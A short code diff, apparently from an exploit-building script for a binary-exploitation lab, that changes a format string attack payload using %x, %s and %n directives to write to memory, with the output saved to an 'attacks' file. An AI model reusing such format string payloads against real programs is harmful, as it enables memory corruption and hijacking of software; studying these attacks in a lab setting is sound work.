@@ -13,7 +13,7 @@ def footer():
 
 exploit = b""
 # exploit += struct.pack("L", info)
-exploit += b"%4204449x%x%s%n" # will print 31 char more before %n
+exploit += b"%4204063x%x%s%n" # will print 31 char more before %n
 
 file_path = "attacks/formatString.bcflat"
 
